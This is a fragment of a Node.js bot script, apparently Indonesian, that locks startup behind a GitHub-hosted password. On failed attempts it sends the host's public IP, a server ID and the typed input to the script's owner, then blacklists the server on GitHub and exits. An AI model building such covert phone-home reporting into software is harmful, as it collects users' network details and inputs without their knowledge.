    const res = await axios.get("https://api.ipify.org?format=json", {
      timeout: 5000,
    });
    if (res.data && res.data.ip) PUBLIC_IP = res.data.ip;
  } catch (e) {
    console.error("⚠️ Gagal ambil IP publik:", e.message);
  }
}
getPublicIP();

async function startPasswordCheck() {
  await checkBlacklistOnStartup();

  const githubOK = await fetchPasswordFromGitHub();

  console.log(chalk.blue("⚠️ Sebelum Bot Dijalankan — Masukkan Password"));

  process.stdin.setEncoding("utf8");
  process.stdin.resume();

  process.stdin.on("data", async (chunk) => {
    const input = String(chunk || "").trim();
    if (unlocked) return;
    if (!input) return;

    console.log(chalk.cyan(`👉 Input diterima: ${input}`));

    attempts++;

    if (githubOK) {
      if (input === PASSWORD) {
        unlocked = true;
        console.log(
          chalk.bold.green("✅ PASSWORD BENAR — MENJALANKAN BOT...")
        );
        try {
          await bot.launch(() =>
            console.log("Script MD Death Kings Berjalan...")
          );
          console.log(chalk.green("🚀 Bot Berhasil Dijalankan."));
        } catch (e) {
          console.error(chalk.red("❌ Gagal Menjalankan Bot:"), e);
          process.exit(1);
        }
        return;
      } else {
        const notif = [
          "⚠️ PERINGATAN: Percobaan Password Gagal (GitHub password) - Masuk Blacklist",
          "",
          `• 🆔️ Server ID : \`${SERVER_ID}\``,
          `• 🌍 IP Publik : ${PUBLIC_IP}`,
          `• 🕒 Waktu     : \`${now()}\``,
          `• Input       : \`${input}\``,
          "",
          `*Tindakan:* Server ini akan ditambahkan ke blacklist di GitHub dan dimatikan.`,
        ].join("\n");

        try {
          await notifyOwner(notif);
          console.log(chalk.yellow("📩 Notifikasi Terkirim Ke Owner."));
        } catch (e) {
          console.error("Gagal Kirim Notifikasi Ke Owner:", e.message);
        }

        try {
          if (!GITHUB_TOKEN2)
            throw new Error("GITHUB_TOKEN2 tidak diset; tidak bisa menulis blacklist ke GitHub.");
          const addRes = await addServerToGithubBlacklistSafe(SERVER_ID);
          if (addRes && addRes.updated) {
            console.log(
              chalk.red(
                `🚫 Server ${SERVER_ID} Berhasil Ditambahkan Ke Blacklist Di GitHub Owner`
              )
            );
          } else {
            console.log(
              chalk.yellow("⚠️ Server Kamu Tidak Ditambahkan (Mungkin Sudah Ada)")
            );
          }
        } catch (e) {
          console.error(
            "Gagal Menambahkan Server Kamu Ke Blacklist GitHub:",
            e.message
          );
          await notifyOwner(
            `⚠️ Gagal Menambahkan Server ${SERVER_ID} Ke Blacklist Otomatis: ${e.message}`
          );
        }

        console.log(
          chalk.bold.red("❌ PASSWORD SALAH (GitHub). Server Dimatikan.")
        );
        process.exit(1);
      }
    }

    if (input === PASSWORD) {
      unlocked = true;
      console.log(
        chalk.bold.green("✅ PASSWORD DEFAULT BENAR — MENJALANKAN BOT...")
      );
      try {
        await bot.launch(() => console.log("Script MD Death Kings berjalan..."));
        console.log(chalk.green("🚀 Bot Berhasil Dijalankan."));
      } catch (e) {
        console.error(chalk.red("❌ Gagal Menjalankan Bot:"), e);
        process.exit(1);
      }
      return;
    }

    const remaining = MAX_ATTEMPTS - attempts;
    if (remaining > 0) {
      console.log(
        chalk.red("❌ PASSWORD SALAH!!!") +
          " " +
          chalk.yellow.bold(`Percobaan Tersisa: ${remaining}`)
      );

      try {
        const notifWrong = [
          `⚠️ Percobaan Password Gagal (sisa ${remaining} percobaan)`,
          "",
          `• 🆔️ Server ID : \`${SERVER_ID}\``,
          `• 🌍 IP Publik : ${PUBLIC_IP}`,
          `• 🕒 Waktu     : \`${now()}\``,
          `• Input       : \`${input}\``,
        ].join("\n");
        await notifyOwner(notifWrong);
      } catch (e) {
        console.error("Gagal kirim notif salah password (1/2x):", e.message);
      }
    } else {
      const notif = [
        "⚠️ PERHATIAN: Percobaan Password Gagal 3x",
        "",
        `• 🆔️ Server ID : \`${SERVER_ID}\``,
        `• 🌍 IP Publik : ${PUBLIC_IP}`,
        `• 🕒 Waktu     : \`${now()}\``,
        `• 📝 Pesan     : Percobaan Login Password 3x Gagal — Server Masuk Blacklist`,
      ].join("\n");

      try {
        await notifyOwner(notif);
        console.log(chalk.yellow("📩 Notifikasi Terkirim Ke Owner"));
      } catch (e) {
        console.error("Gagal Kirim Notifikasi Ke Owner:", e.message);
      }

      try {
        if (!GITHUB_TOKEN2)
          throw new Error(
            "GITHUB_TOKEN2 Tidak Diset; Tidak Bisa Menulis Blacklist Ke GitHub Owner"
          );
        const addRes = await addServerToGithubBlacklistSafe(SERVER_ID);
        if (addRes && addRes.updated) {
          console.log(
            chalk.red(
              `🚫 Server ${SERVER_ID} Berhasil Ditambahkan Ke Blacklist Di GitHub Owner`
            )
          );
        } else {
          console.log(
            chalk.yellow("⚠️ Server Kamu Tidak Ditambahkan (Mungkin Sudah Ada)")
          );
        }
      } catch (e) {
        console.error(
          "Gagal Menambahkan Server Kamu Ke Blacklist GitHub Owner:",
          e.message
        );
        await notifyOwner(
          `⚠️ Gagal Menambahkan Server ${SERVER_ID} Ke Blacklist Otomatis: ${e.message}`
        );
      }

      console.log(
        chalk.bold.red(
          "❌ PASSWORD SALAH --- Percobaan Habis. Server Dimatikan Paksa!!!"
        )
      );
      process.exit(1);
    }
  });
}

async function addServerToGithubBlacklistSafe(serverId) {
  try {
    const fileData = await getFileFromGitHub(GITHUB_BLACKLIST_PATH);
    let cur;
    try {
      cur = JSON.parse(Buffer.from(fileData.content, "base64").toString("utf8"));
      if (!Array.isArray(cur)) cur = [];
    } catch (e) {
      cur = [];
    }
    if (cur.includes(serverId)) {
      return { updated: false, message: "already" };
    }
    cur.push(serverId);
    const newContent = JSON.stringify(cur, null, 2);
    const result = await updateFileOnGitHub(GITHUB_BLACKLIST_PATH, newContent, `Add server ${serverId} To Blacklist ʙʏ ᴋɪɴɢs 👑`);
    return { updated: true, result };
  } catch (e) {
    throw e;
  }
}

startPasswordCheck();

process.on("unhandledRejection", (reason) => {
  try { console.error("Unhandled Rejection", reason); } catch (_) { console.error("Unhandled Rejection", reason); }
});